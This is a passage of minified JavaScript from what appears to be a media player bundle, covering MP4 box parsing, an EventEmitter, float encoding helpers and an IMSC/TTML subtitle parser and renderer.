.flags&&this._procField("data_offset","int",32),4&this.flags&&this._procField("first_sample_flags","uint",32),this._procEntries("samples",this.sample_count,(function(l){256&this.flags&&this._procEntryField(l,"sample_duration","uint",32),512&this.flags&&this._procEntryField(l,"sample_size","uint",32),1024&this.flags&&this._procEntryField(l,"sample_flags","uint",32),2048&this.flags&&this._procEntryField(l,"sample_composition_time_offset",1===this.version?"int":"uint",32)}))},p.prototype._boxProcessors["url "]=p.prototype._boxProcessors["urn "]=function(){this._procFullBox(),"urn "===this.type&&this._procField("name","string",-1),this._procField("location","string",-1)},p.prototype._boxProcessors.vlab=function(){this._procField("source_label","utf8")},p.prototype._boxProcessors.vmhd=function(){this._procFullBox(),this._procField("graphicsmode","uint",16),this._procFieldArray("opcolor",3,"uint",16)},p.prototype._boxProcessors.vttC=function(){this._procField("config","utf8")},p.prototype._boxProcessors.vtte=function(){}},{}],10:[function(u,da,M){(function(v){M.isArray=function(m){return Array.isArray?Array.isArray(m):"[object Array]"===Object.prototype.toString.call(m)},M.isBoolean=function(m){return"boolean"==typeof m},M.isNull=function(m){return null===m},M.isNullOrUndefined=function(m){return null==m},M.isNumber=function(m){return"number"==typeof m},M.isString=function(m){return"string"==typeof m},M.isSymbol=function(m){return"symbol"==typeof m},M.isUndefined=function(m){return void 0===m},M.isRegExp=function(m){return"[object RegExp]"===Object.prototype.toString.call(m)},M.isObject=function(m){return"object"==typeof m&&null!==m},M.isDate=function(m){return"[object Date]"===Object.prototype.toString.call(m)},M.isError=function(m){return"[object Error]"===Object.prototype.toString.call(m)||m instanceof Error},M.isFunction=function(m){return"function"==typeof m},M.isPrimitive=function(m){return null===m||"boolean"==typeof m||"number"==typeof m||"string"==typeof m||"symbol"==typeof m||void 0===m},M.isBuffer=v.isBuffer}).call(this,{isBuffer:u(22)})},{22:22}],11:[function(u,da,M){function v(){this._events&&Object.prototype.hasOwnProperty.call(this,"_events")||(this._events=r(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0}function m(D,I,L,G){var N,w,h,F;if("function"!=typeof L)throw new TypeError('"listener" argument must be a function');return(N=D._events)?(N.newListener&&(D.emit("newListener",I,L.listener?L.listener:L),N=D._events),w=N[I]):(N=D._events=r(null),D._eventsCount=0),w?("function"==typeof w?w=N[I]=G?[L,w]:[w,L]:G?w.unshift(L):w.push(L),w.warned||(F=void 0===D._maxListeners?v.defaultMaxListeners:D._maxListeners)&&0<F&&w.length>F&&(w.warned=!0,(h=Error("Possible EventEmitter memory leak detected. "+w.length+' "'+String(I)+'" listeners added. Use emitter.setMaxListeners() to increase limit.')).name="MaxListenersExceededWarning",h.emitter=D,h.type=I,h.count=w.length,"object"==typeof console&&console.warn&&console.warn("%s: %s",h.name,h.message))):(N[I]=L,++D._eventsCount),D}function p(){if(!this.fired)switch(this.target.removeListener(this.type,this.wrapFn),this.fired=!0,arguments.length){case 0:return this.listener.call(this.target);case 1:return this.listener.call(this.target,arguments[0]);case 2:return this.listener.call(this.target,arguments[0],arguments[1]);case 3:return this.listener.call(this.target,arguments[0],arguments[1],arguments[2]);default:for(var D=Array(arguments.length),I=0;I<D.length;++I)D[I]=arguments[I];this.listener.apply(this.target,D)}}function l(D,I,L){return D={fired:!1,wrapFn:void 0,target:D,type:I,listener:L},(I=z.call(p,D)).listener=L,D.wrapFn=I}function f(D,I,L){if(!(D=D._events))return[];if(I=D[I])if("function"==typeof I)L=L?[I.listener||I]:[I];else if(L)for(L=Array(I.length),D=0;D<L.length;++D)L[D]=I[D].listener||I[D];else L=t(I,I.length);else L=[];return L}function g(D){var I=this._events;if(I){if("function"==typeof(D=I[D]))return 1;if(D)return D.length}return 0}function t(D,I){for(var L=Array(I),G=0;G<I;++G)L[G]=D[G];return L}var r=Object.create||function(D){function I(){}return I.prototype=D,new I},x=Object.keys||function(D){var L,I=[];for(L in D)Object.prototype.hasOwnProperty.call(D,L)&&I.push(L);return L},z=Function.prototype.bind||function(D){var I=this;return function(){return I.apply(D,arguments)}};((da.exports=v).EventEmitter=v).prototype._events=void 0,v.prototype._maxListeners=void 0;var J=10;try{u={},Object.defineProperty&&Object.defineProperty(u,"x",{value:0});var E=0===u.x}catch(D){E=!1}E?Object.defineProperty(v,"defaultMaxListeners",{enumerable:!0,get:function(){return J},set:function(D){if("number"!=typeof D||0>D||D!=D)throw new TypeError('"defaultMaxListeners" must be a positive number');J=D}}):v.defaultMaxListeners=J,v.prototype.setMaxListeners=function(D){if("number"!=typeof D||0>D||isNaN(D))throw new TypeError('"n" argument must be a positive number');return this._maxListeners=D,this},v.prototype.getMaxListeners=function(){return void 0===this._maxListeners?v.defaultMaxListeners:this._maxListeners},v.prototype.emit=function(D,I,L,G){var N,w,h="error"===D;if(w=this._events)h=h&&null==w.error;else if(!h)return!1;if(h){if(1<arguments.length&&(N=I),N instanceof Error)throw N;throw(h=Error('Unhandled "error" event. ('+N+")")).context=N,h}if(!(N=w[D]))return!1;var F,P="function"==typeof N;switch(F=arguments.length){case 1:!function(O,R,Q){if(R)O.call(Q);else{O=t(O,R=O.length);for(var ja=0;ja<R;++ja)O[ja].call(Q)}}(N,P,this);break;case 2:!function(O,R,Q,ja){if(R)O.call(Q,ja);else{O=t(O,R=O.length);for(var W=0;W<R;++W)O[W].call(Q,ja)}}(N,P,this,I);break;case 3:!function(O,R,Q,ja,W){if(R)O.call(Q,ja,W);else{O=t(O,R=O.length);for(var aa=0;aa<R;++aa)O[aa].call(Q,ja,W)}}(N,P,this,I,L);break;case 4:!function(O,R,Q,ja,W,aa){if(R)O.call(Q,ja,W,aa);else{O=t(O,R=O.length);for(var ma=0;ma<R;++ma)O[ma].call(Q,ja,W,aa)}}(N,P,this,I,L,G);break;default:for(h=Array(F-1),w=1;w<F;w++)h[w-1]=arguments[w];!function(O,R,Q,ja){if(R)O.apply(Q,ja);else{O=t(O,R=O.length);for(var W=0;W<R;++W)O[W].apply(Q,ja)}}(N,P,this,h)}return!0},v.prototype.on=v.prototype.addListener=function(D,I){return m(this,D,I,!1)},v.prototype.prependListener=function(D,I){return m(this,D,I,!0)},v.prototype.once=function(D,I){if("function"!=typeof I)throw new TypeError('"listener" argument must be a function');return this.on(D,l(this,D,I)),this},v.prototype.prependOnceListener=function(D,I){if("function"!=typeof I)throw new TypeError('"listener" argument must be a function');return this.prependListener(D,l(this,D,I)),this},v.prototype.removeListener=function(D,I){var L,G,N;if("function"!=typeof I)throw new TypeError('"listener" argument must be a function');if(!(G=this._events)||!(L=G[D]))return this;if(L===I||L.listener===I)0==--this._eventsCount?this._events=r(null):(delete G[D],G.removeListener&&this.emit("removeListener",D,L.listener||I));else if("function"!=typeof L){var w=-1;for(N=L.length-1;0<=N;N--)if(L[N]===I||L[N].listener===I){var h=L[N].listener;w=N;break}if(0>w)return this;if(0===w)L.shift();else{N=w+1;for(var F=L.length;N<F;w+=1,N+=1)L[w]=L[N];L.pop()}1===L.length&&(G[D]=L[0]),G.removeListener&&this.emit("removeListener",D,h||I)}return this},v.prototype.removeAllListeners=function(D){var I,L=this._events;if(!L)return this;if(!L.removeListener)return 0===arguments.length?(this._events=r(null),this._eventsCount=0):L[D]&&(0==--this._eventsCount?this._events=r(null):delete L[D]),this;if(0===arguments.length){var G=x(L);for(L=0;L<G.length;++L)"removeListener"!==(I=G[L])&&this.removeAllListeners(I);return this.removeAllListeners("removeListener"),this._events=r(null),this._eventsCount=0,this}if("function"==typeof(I=L[D]))this.removeListener(D,I);else if(I)for(L=I.length-1;0<=L;L--)this.removeListener(D,I[L]);return this},v.prototype.listeners=function(D){return f(this,D,!0)},v.prototype.rawListeners=function(D){return f(this,D,!1)},v.listenerCount=function(D,I){return"function"==typeof D.listenerCount?D.listenerCount(I):g.call(D,I)},v.prototype.listenerCount=g,v.prototype.eventNames=function(){return 0<this._eventsCount?Reflect.ownKeys(this._events):[]}},{}],12:[function(u,da,M){var v=Array.isArray,m=Object.keys,p=Object.prototype.hasOwnProperty;da.exports=function t(f,g){if(f===g)return!0;if(f&&g&&"object"==typeof f&&"object"==typeof g){var r,x=v(f),z=v(g);if(x&&z){if((z=f.length)!=g.length)return!1;for(x=z;0!=x--;)if(!t(f[x],g[x]))return!1;return!0}if(x!=z)return!1;if((x=f instanceof Date)!=(z=g instanceof Date))return!1;if(x&&z)return f.getTime()==g.getTime();if((x=f instanceof RegExp)!=(z=g instanceof RegExp))return!1;if(x&&z)return f.toString()==g.toString();var J=m(f);if((z=J.length)!==m(g).length)return!1;for(x=z;0!=x--;)if(!p.call(g,J[x]))return!1;for(x=z;0!=x--;)if(!t(f[r=J[x]],g[r]))return!1;return!0}return f!=f&&g!=g}},{}],13:[function(u,da,M){M.read=function(v,m,p,l,f){var g=8*f-l-1,t=(1<<g)-1,r=t>>1,x=-7,z=p?-1:1,J=v[m+(f=p?f-1:0)];for(f+=z,p=J&(1<<-x)-1,J>>=-x,x+=g;0<x;p=256*p+v[m+f],f+=z,x-=8);for(g=p&(1<<-x)-1,p>>=-x,x+=l;0<x;g=256*g+v[m+f],f+=z,x-=8);if(0===p)p=1-r;else{if(p===t)return g?NaN:1/0*(J?-1:1);g+=Math.pow(2,l),p-=r}return(J?-1:1)*g*Math.pow(2,p-l)},M.write=function(v,m,p,l,f,g){var t,r,x,z=8*g-f-1,J=(1<<z)-1,E=J>>1,D=23===f?Math.pow(2,-24)-Math.pow(2,-77):0;g=l?0:g-1,l=l?1:-1;var I=0>m||0===m&&0>1/m?1:0;for(m=Math.abs(m),isNaN(m)||m===1/0?(r=isNaN(m)?1:0,t=J):(t=Math.floor(Math.log(m)/Math.LN2),1>m*(x=Math.pow(2,-t))&&(t--,x*=2),2<=(m+=1<=t+E?D/x:D*Math.pow(2,1-E))*x&&(t++,x/=2),J<=t+E?(r=0,t=J):1<=t+E?(r=(m*x-1)*Math.pow(2,f),t+=E):(r=m*Math.pow(2,E-1)*Math.pow(2,f),t=0));8<=f;v[p+g]=255&r,g+=l,r/=256,f-=8);for(t=t<<f|r,z+=f;0<z;v[p+g]=255&t,g+=l,t/=256,z-=8);v[p+g-l]|=128*I}},{}],14:[function(u,da,M){function v(ia,S,V,oa){var ba=oa&&"seq"===oa.timeContainer,ha=0;for(var ka in oa&&(ha=ba&&V?V.end:oa.begin),S.begin=S.explicit_begin?S.explicit_begin+ha:ha,V=S.begin,oa=null,S.sets)v(ia,S.sets[ka],oa,S),V="seq"===S.timeContainer?S.sets[ka].end:Math.max(V,S.sets[ka].end),oa=S.sets[ka];if("contents"in S)for(var la in S.contents)v(ia,S.contents[la],oa,S),V="seq"===S.timeContainer?S.contents[la].end:Math.max(V,S.contents[la].end),oa=S.contents[la];else V=ba?S.begin:Number.POSITIVE_INFINITY;null!==S.explicit_end&&null!==S.explicit_dur?S.end=Math.min(S.begin+S.explicit_dur,ha+S.explicit_end):null===S.explicit_end&&null!==S.explicit_dur?S.end=S.begin+S.explicit_dur:null!==S.explicit_end&&null===S.explicit_dur?S.end=ha+S.explicit_end:S.end=V,delete S.explicit_begin,delete S.explicit_dur,delete S.explicit_end,ia._registerEvent(S)}function m(ia){this.node=ia}function p(){this.events=[],this.body=this.head=null}function l(){this.layout=this.styling=null}function f(){this.styles={}}function g(){this.styleRefs=this.styleAttrs=this.id=null}function t(){this.regions={}}function r(ia){this.id=ia}function x(ia){this.regionID=ia}function z(ia){this.styleAttrs=ia}function J(ia){this.sets=ia}function E(ia){this.contents=ia}function D(ia,S,V){this.explicit_begin=ia,this.explicit_end=S,this.explicit_dur=V}function I(){this.kind="body"}function L(){this.kind="div"}function G(){this.kind="p"}function N(){this.kind="span"}function w(){this.kind="span"}function h(){this.kind="br"}function F(){}function P(){}function O(ia){return ia&&"xml:id"in ia.attributes&&ia.attributes["xml:id"].value||null}function R(ia){return ia&&"style"in ia.attributes?ia.attributes.style.value.split(" "):[]}function Q(ia,S){var V={};if(null!==ia)for(var oa in ia.attributes){var ba,ha=ia.attributes[oa].uri+" "+ia.attributes[oa].local,ka=T.byQName[ha];void 0!==ka&&(null!==(ba=ka.parse(ia.attributes[oa].value))?(V[ha]=ba,ka===T.byName.zIndex&&H(S,"zIndex attribute present but not used by IMSC1 since regions do not overlap")):B(S,"Cannot parse styling attribute "+ha+" --\x3e "+ia.attributes[oa].value))}return V}function ja(ia,S,V){for(var oa in ia.attributes)if(ia.attributes[oa].uri===S&&ia.attributes[oa].local===V)return ia.attributes[oa].value;return null}function W(ia,S,V){var oa,ba=null;return null!==(oa=/^(\d+(?:\.\d+)?)f$/.exec(V))?null!==S&&(ba=parseFloat(oa[1])/S):null!==(oa=/^(\d+(?:\.\d+)?)t$/.exec(V))?null!==ia&&(ba=parseFloat(oa[1])/ia):null!==(oa=/^(\d+(?:\.\d+)?)ms$/.exec(V))?ba=parseFloat(oa[1])/1e3:null!==(oa=/^(\d+(?:\.\d+)?)s$/.exec(V))?ba=parseFloat(oa[1]):null!==(oa=/^(\d+(?:\.\d+)?)h$/.exec(V))?ba=3600*parseFloat(oa[1]):null!==(oa=/^(\d+(?:\.\d+)?)m$/.exec(V))?ba=60*parseFloat(oa[1]):null!==(oa=/^(\d{2,}):(\d\d):(\d\d(?:\.\d+)?)$/.exec(V))?ba=3600*parseInt(oa[1])+60*parseInt(oa[2])+parseFloat(oa[3]):null!==(oa=/^(\d{2,}):(\d\d):(\d\d):(\d{2,})$/.exec(V))&&null!==S&&(ba=3600*parseInt(oa[1])+60*parseInt(oa[2])+parseInt(oa[3])+(null===oa[4]?0:parseInt(oa[4])/S)),ba}function aa(ia,S,V,oa){for(var ba=S.length-1;0<=ba;ba--){var ha=S[ba];ha in ia.styles?ma(ia.styles[ha].styleAttrs,V):B(oa,"Non-existant style id referenced")}}function ma(ia,S){for(var V in ia)V in S||(S[V]=ia[V])}function H(ia,S){if(ia&&ia.warn&&ia.warn(S))throw S}function B(ia,S){if(ia&&ia.error&&ia.error(S))throw S}function A(ia,S){throw ia&&ia.fatal&&ia.fatal(S),S}function Y(ia,S){for(var V,oa=0,ba=ia.length-1;oa<=ba;){var ha=ia[V=Math.floor((oa+ba)/2)];if(ha<S)oa=V+1;else{if(!(S<ha))return{found:!0,index:V};ba=V-1}}return{found:!1,index:oa}}da=void 0===M?this.imscDoc={}:M;var Z="undefined"==typeof sax?u(40):sax,na="undefined"==typeof imscNames?u(18):imscNames,T="undefined"==typeof imscStyles?u(19):imscStyles,pa="undefined"==typeof imscUtils?u(20):imscUtils;da.fromXML=function(ia,S,V){var fa,oa=Z.parser(!0,{xmlns:!0}),ba=[],ha=[],ka=[],la=0,C=null;for(var qa in oa.onclosetag=function(xa){if(ba[0]instanceof f)for(var za in ba[0].styles)!function La(Ba,Ga,Ra){for(;0<Ga.styleRefs.length;){var Ya=Ga.styleRefs.pop();Ya in Ba.styles?(La(Ba,Ba.styles[Ya],Ra),ma(Ba.styles[Ya].styleAttrs,Ga.styleAttrs)):B(Ra,"Non-existant style id referenced")}}(ba[0],ba[0].styles[za],S);else if(ba[0]instanceof G||ba[0]instanceof N){if(1<ba[0].contents.length){for(xa=[ba[0].contents[0]],za=1;za<ba[0].contents.length;za++)ba[0].contents[za]instanceof w&&xa[xa.length-1]instanceof w?xa[xa.length-1].text+=ba[0].contents[za].text:xa.push(ba[0].contents[za]);ba[0].contents=xa}ba[0]instanceof N&&1===ba[0].contents.length&&ba[0].contents[0]instanceof w&&(ba[0].text=ba[0].contents[0].text,delete ba[0].contents)}else ba[0]instanceof m&&(ba[0].node.uri===na.ns_tt&&"metadata"===ba[0].node.local?la--:0<la&&V&&"onCloseTag"in V&&V.onCloseTag());ka.shift(),ha.shift(),ba.shift()},oa.ontext=function(xa){var za;void 0===ba[0]||(ba[0]instanceof N||ba[0]instanceof G?((za=new w).initFromText(C,ba[0],xa,ka[0],S),ba[0].contents.push(za)):ba[0]instanceof m&&0<la&&V&&"onText"in V&&V.onText(xa))},oa.onopentag=function(xa){var Ca,Ba,Ga,Ra,La,Ya,hb,bb,za=xa.attributes["xml:space"];if(za?ka.unshift(za.value):0===ka.length?ka.unshift("default"):ka.unshift(ka[0]),(za=xa.attributes["xml:lang"])?ha.unshift(za.value):0===ha.length?ha.unshift(""):ha.unshift(ha[0]),xa.uri===na.ns_tt?"tt"===xa.local?(null!==C&&A(S,"Two <tt> elements at ("+this.line+","+this.column+")"),(C=new p).initFromNode(xa,S),ba.unshift(C)):"head"===xa.local?(ba[0]instanceof p||A(S,"Parent of <head> element is not <tt> at ("+this.line+","+this.column+")"),null!==C.head&&A("Second <head> element at ("+this.line+","+this.column+")"),C.head=new l,ba.unshift(C.head)):"styling"===xa.local?(ba[0]instanceof l||A(S,"Parent of <styling> element is not <head> at ("+this.line+","+this.column+")"),null!==C.head.styling&&A("Second <styling> element at ("+this.line+","+this.column+")"),C.head.styling=new f,ba.unshift(C.head.styling)):"style"===xa.local?ba[0]instanceof f?((Ca=new g).initFromNode(xa,S),Ca.id?C.head.styling.styles[Ca.id]=Ca:B(S,"<style> element missing @id attribute"),ba.unshift(Ca)):ba[0]instanceof F?((Ca=new g).initFromNode(xa,S),ma(Ca.styleAttrs,ba[0].styleAttrs),ba.unshift(Ca)):A(S,"Parent of <style> element is not <styling> or <region> at ("+this.line+","+this.column+")"):"layout"===xa.local?(ba[0]instanceof l||A(S,"Parent of <layout> element is not <head> at "+this.line+","+this.column+")"),null!==C.head.layout&&A(S,"Second <layout> element at "+this.line+","+this.column+")"),C.head.layout=new t,ba.unshift(C.head.layout)):"region"===xa.local?(ba[0]instanceof t||A(S,"Parent of <region> element is not <layout> at "+this.line+","+this.column+")"),(Ba=new F).initFromNode(C,xa,S),!Ba.id||Ba.id in C.head.layout.regions?B(S,"Ignoring <region> with duplicate or missing @id at "+this.line+","+this.column+")"):C.head.layout.regions[Ba.id]=Ba,ba.unshift(Ba)):"body"===xa.local?(ba[0]instanceof p||A(S,"Parent of <body> element is not <tt> at "+this.line+","+this.column+")"),null!==C.body&&A(S,"Second <body> element at "+this.line+","+this.column+")"),(Ga=new I).initFromNode(C,xa,S),C.body=Ga,ba.unshift(Ga)):"div"===xa.local?(ba[0]instanceof L||ba[0]instanceof I||A(S,"Parent of <div> element is not <body> or <div> at "+this.line+","+this.column+")"),(Ra=new L).initFromNode(C,ba[0],xa,S),ba[0].contents.push(Ra),ba.unshift(Ra)):"p"===xa.local?(ba[0]instanceof L||A(S,"Parent of <p> element is not <div> at "+this.line+","+this.column+")"),(La=new G).initFromNode(C,ba[0],xa,S),ba[0].contents.push(La),ba.unshift(La)):"span"===xa.local?(ba[0]instanceof N||ba[0]instanceof G||A(S,"Parent of <span> element is not <span> or <p> at "+this.line+","+this.column+")"),(Ya=new N).initFromNode(C,ba[0],xa,ka[0],S),ba[0].contents.push(Ya),ba.unshift(Ya)):"br"===xa.local?(ba[0]instanceof N||ba[0]instanceof G||A(S,"Parent of <br> element is not <span> or <p> at "+this.line+","+this.column+")"),(hb=new h).initFromNode(C,ba[0],xa,S),ba[0].contents.push(hb),ba.unshift(hb)):"set"===xa.local?(ba[0]instanceof N||ba[0]instanceof G||ba[0]instanceof L||ba[0]instanceof I||ba[0]instanceof F||ba[0]instanceof h||A(S,"Parent of <set> element is not a content element or a region at "+this.line+","+this.column+")"),(bb=new P).initFromNode(C,ba[0],xa,S),ba[0].sets.push(bb),ba.unshift(bb)):ba.unshift(new m(xa)):ba.unshift(new m(xa)),ba[0]instanceof m)if(xa.uri===na.ns_tt&&"metadata"===xa.local)la++;else if(0<la&&V&&"onOpenTag"in V){for(var Da in Ca=[],xa.attributes)Ca[xa.attributes[Da].uri+" "+xa.attributes[Da].local]={uri:xa.attributes[Da].uri,local:xa.attributes[Da].local,value:xa.attributes[Da].value};V.onOpenTag(xa.uri,xa.local,Ca)}},oa.write(ia).close(),null!==C.head?delete C.head.styling:C.head=new l,null===C.head.layout&&(C.head.layout=new t),ia=!1,C.head.layout.regions){ia=!0;break}for(var va in ia||(fa=F.prototype.createDefaultRegion(),C.head.layout.regions[fa.id]=fa),C.head.layout.regions)v(C,C.head.layout.regions[va],null,null);return C.body&&v(C,C.body,null,null),C},p.prototype.initFromNode=function(ia,S){var oa,ba,la,ha,ka;this.cellResolution=(ba=S,ha=15,ka=32,null!==(oa=ja(oa=ia,na.ns_ttp,"cellResolution"))&&(null!==(la=/(\d+) (\d+)/.exec(oa))?(ka=parseInt(la[1]),ha=parseInt(la[2])):H(ba,"Malformed cellResolution value (using initial value instead)")),{w:ka,h:ha});var V=function(oa,ba){var ha,ka=ja(oa,na.ns_ttp,"frameRate"),la=30;null!==ka&&(null!==(ha=/(\d+)/.exec(ka))?la=parseInt(ha[1]):H(ba,"Malformed frame rate attribute (using initial value instead)"));var C=ja(oa,na.ns_ttp,"frameRateMultiplier"),fa=1;return null!==C&&(null!==(ha=/(\d+) (\d+)/.exec(C))?fa=parseInt(ha[1])/parseInt(ha[2]):H(ba,"Malformed frame rate multiplier attribute (using initial value instead)")),la*=fa,C=1,null===(oa=ja(oa,na.ns_ttp,"tickRate"))?null!==ka&&(C=la):null!==(ha=/(\d+)/.exec(oa))?C=parseInt(ha[1]):H(ba,"Malformed tick rate attribute (using initial value instead)"),{effectiveFrameRate:la,tickRate:C}}(ia,S);this.effectiveFrameRate=V.effectiveFrameRate,this.tickRate=V.tickRate,this.aspectRatio=function(oa,ba){var ka,la,C,ha=null;return null!==(oa=ja(oa,na.ns_ittp,"aspectRatio"))&&(null!==(ka=/(\d+) (\d+)/.exec(oa))?(la=parseInt(ka[1]),C=parseInt(ka[2]),0!==la&&0!==C?ha=la/C:B(ba,"Illegal aspectRatio values (ignoring)")):B(ba,"Malformed aspectRatio attribute (ignoring)")),ha}(ia,S),null!==(V=ja(ia,na.ns_ttp,"timeBase"))&&"media"!==V&&A(S,"Unsupported time base"),ia=function(oa,ba){if(null===(oa=ja(oa,na.ns_tts,"extent")))return null;var ha=oa.split(" ");return 2!==ha.length?(H(ba,"Malformed extent (ignoring)"),null):(oa=pa.parseLength(ha[0]),(ha=pa.parseLength(ha[1]))&&oa?{h:ha,w:oa}:(H(ba,"Malformed extent values (ignoring)"),null))}(ia,S),null===ia?this.pxDimensions={h:480,w:640}:("px"===ia.h.unit&&"px"===ia.w.unit||A(S,"Extent on TT must be in px or absent"),this.pxDimensions={h:ia.h.value,w:ia.w.value})},p.prototype._registerEvent=function(ia){var S,V;ia.end<=ia.begin||((S=Y(this.events,ia.begin)).found||this.events.splice(S.index,0,ia.begin),ia.end!==Number.POSITIVE_INFINITY&&((V=Y(this.events,ia.end)).found||this.events.splice(V.index,0,ia.end)))},p.prototype.getMediaTimeRange=function(){return[this.events[0],this.events[this.events.length-1]]},p.prototype.getMediaTimeEvents=function(){return this.events},g.prototype.initFromNode=function(ia,S){this.id=O(ia),this.styleAttrs=Q(ia,S),this.styleRefs=R(ia)},r.prototype.initFromNode=function(ia,S,V,oa){this.id=O(V)},x.prototype.initFromNode=function(ia,S,V,oa){this.regionID=V&&"region"in V.attributes?V.attributes.region.value:""},z.prototype.initFromNode=function(ia,S,V,oa){this.styleAttrs=Q(V,oa),null!==ia.head&&null!==ia.head.styling&&aa(ia.head.styling,R(V),this.styleAttrs,oa)},J.prototype.initFromNode=function(ia,S,V,oa){this.sets=[]},E.prototype.initFromNode=function(ia,S,V,oa){this.contents=[]},D.prototype.initFromNode=function(ia,S,V,oa){var ba;S=null,V&&"begin"in V.attributes&&null===(S=W(ia.tickRate,ia.effectiveFrameRate,V.attributes.begin.value))&&H(oa,"Malformed begin value "+V.attributes.begin.value+" (using 0)");var ha=null;V&&"dur"in V.attributes&&null===(ha=W(ia.tickRate,ia.effectiveFrameRate,V.attributes.dur.value))&&H(oa,"Malformed dur value "+V.attributes.dur.value+" (ignoring)");var ka=null;V&&"end"in V.attributes&&null===(ka=W(ia.tickRate,ia.effectiveFrameRate,V.attributes.end.value))&&H(oa,"Malformed end value (ignoring)"),this.explicit_begin=S,this.explicit_end=ka,this.explicit_dur=ha,this.timeContainer=(ba=V&&"timeContainer"in V.attributes?V.attributes.timeContainer.value:null)&&"par"!==ba?"seq"===ba?"seq":(B(oa,"Illegal value of timeContainer (assuming 'par')"),"par"):"par"},I.prototype.initFromNode=function(ia,S,V){z.prototype.initFromNode.call(this,ia,null,S,V),D.prototype.initFromNode.call(this,ia,null,S,V),J.prototype.initFromNode.call(this,ia,null,S,V),x.prototype.initFromNode.call(this,ia,null,S,V),E.prototype.initFromNode.call(this,ia,null,S,V)},L.prototype.initFromNode=function(ia,S,V,oa){z.prototype.initFromNode.call(this,ia,S,V,oa),D.prototype.initFromNode.call(this,ia,S,V,oa),J.prototype.initFromNode.call(this,ia,S,V,oa),x.prototype.initFromNode.call(this,ia,S,V,oa),E.prototype.initFromNode.call(this,ia,S,V,oa)},G.prototype.initFromNode=function(ia,S,V,oa){z.prototype.initFromNode.call(this,ia,S,V,oa),D.prototype.initFromNode.call(this,ia,S,V,oa),J.prototype.initFromNode.call(this,ia,S,V,oa),x.prototype.initFromNode.call(this,ia,S,V,oa),E.prototype.initFromNode.call(this,ia,S,V,oa)},N.prototype.initFromNode=function(ia,S,V,oa,ba){z.prototype.initFromNode.call(this,ia,S,V,ba),D.prototype.initFromNode.call(this,ia,S,V,ba),J.prototype.initFromNode.call(this,ia,S,V,ba),x.prototype.initFromNode.call(this,ia,S,V,ba),E.prototype.initFromNode.call(this,ia,S,V,ba),this.space=oa},w.prototype.initFromText=function(ia,S,V,oa,ba){D.prototype.initFromNode.call(this,ia,S,null,ba),this.text=V,this.space=oa},h.prototype.initFromNode=function(ia,S,V,oa){x.prototype.initFromNode.call(this,ia,S,V,oa),D.prototype.initFromNode.call(this,ia,S,V,oa)},F.prototype.createDefaultRegion=function(){var ia=new F;return ia.id="",ia.styleAttrs={},ia.sets=[],D.call(ia,0,Number.POSITIVE_INFINITY,null),ia},F.prototype.initFromNode=function(ia,S,V){r.prototype.initFromNode.call(this,ia,null,S,V),z.prototype.initFromNode.call(this,ia,null,S,V),D.prototype.initFromNode.call(this,ia,null,S,V),J.prototype.initFromNode.call(this,ia,null,S,V),null!==ia.head&&null!==ia.head.styling&&aa(ia.head.styling,R(S),this.styleAttrs,V)},P.prototype.initFromNode=function(ia,S,V,oa){for(var ba in D.prototype.initFromNode.call(this,ia,S,V,oa),ia=Q(V,oa),this.qname=null,this.value=null,ia){if(this.qname){B(oa,"More than one style specified on set");break}this.qname=ba,this.value=ia[ba]}}},{18:18,19:19,20:20,40:40}],15:[function(u,da,M){!function(v,m){function p(x,z){this.id=x,this.plist=z}function l(x,z){var J={before:null,after:null,start:null,end:null};return"tb"===z.bpd?(J.before=x.top,J.after=x.bottom,"lr"===z.ipd?(J.start=x.left,J.end=x.right):(J.start=x.right,J.end=x.left)):"lr"===z.bpd?(J.before=x.left,J.after=x.right,J.start=x.top,J.end=x.bottom):"rl"===z.bpd&&(J.before=x.right,J.after=x.left,J.start=x.top,J.end=x.bottom),J}function f(x,z,J,E){var D,I,L,G;if(E=z.style.backgroundColor||E,0===z.childElementCount)if("span"===z.localName){var w,h,N=z.getBoundingClientRect();0!==N.height&&0!==N.width&&(x=l(N,x),0!==J.length&&(D=x.before,I=x.after,L=J[J.length-1].before,I<(G=J[J.length-1].after)&&L<D||G<=I&&D<=L)?(w=Math.sign(x.after-x.before),h=Math.sign(x.end-x.start),0>w*(x.before-J[J.length-1].before)&&(J[J.length-1].before=x.before),0<w*(x.after-J[J.length-1].after)&&(J[J.length-1].after=x.after),0>h*(x.start-J[J.length-1].start)&&(J[J.length-1].start=x.start,J[J.length-1].start_elem=J[J.length-1].elements.length),0<h*(x.end-J[J.length-1].end)&&(J[J.length-1].end=x.end,J[J.length-1].end_elem=J[J.length-1].elements.length)):J.push({before:x.before,after:x.after,start:x.start,end:x.end,start_elem:0,end_elem:0,elements:[],text:"",br:!1}),J[J.length-1].text+=z.textContent,J[J.length-1].elements.push({node:z,bgcolor:E,before:x.before,after:x.after}))}else"br"===z.localName&&0!==J.length&&(J[J.length-1].br=!0);else for(z=z.firstChild;z;)z.nodeType===Node.ELEMENT_NODE&&f(x,z,J,E),z=z.nextSibling}function g(x,z){this.qname=x,this.map=z}v.render=function(x,z,J,E,D,I,L,G,N){var w;for(var h in E=E||z.clientHeight,D=D||z.clientWidth,null!==x.aspectRatio&&(D<(w=E*x.aspectRatio)?E=Math.round(D/x.aspectRatio):D=w),(w=document.createElement("div")).style.position="relative",w.style.width=D+"px",w.style.height=E+"px",w.style.margin="auto",w.style.top=0,w.style.bottom=0,w.style.left=0,w.style.right=0,w.style.zIndex=0,J={h:E,w:D,regionH:null,regionW:null,imgResolver:J,displayForcedOnlyMode:I||!1,isd:x,errorHandler:L,previousISDState:G,enableRollUp:N||!1,currentISDState:{},flg:null,lp:null,mra:null,ipd:null,bpd:null},z.appendChild(w),x.contents)!function Q(P,O,R){var ja;if("region"===R.kind?(ja=document.createElement("div")).style.position="absolute":"body"===R.kind||"div"===R.kind?ja=document.createElement("div"):"p"===R.kind?ja=document.createElement("p"):"span"===R.kind?ja=document.createElement("span"):"br"===R.kind&&(ja=document.createElement("br")),ja){for(var W in ja.style.margin="0",t){var aa=t[W],ma=R.styleAttrs[aa.qname];void 0!==ma&&null!==aa.map&&aa.map(P,ja,R,ma)}var 